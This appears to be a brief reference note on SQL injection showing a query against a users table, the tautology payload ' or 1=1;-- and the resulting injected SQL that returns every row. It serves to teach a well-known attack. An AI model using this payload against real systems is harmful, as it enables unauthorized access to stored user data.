---
tags:
- sqlInjection
---

# SQL injection return all items in the table

Original SQL
```sql
SELECT * FROM users WHERE username = 'Tostadas'
```

Payload   
```sql  
' or 1=1;--  
```

Result SQL
```sql
SELECT * FROM users WHERE username = '' or 1=1;--'
```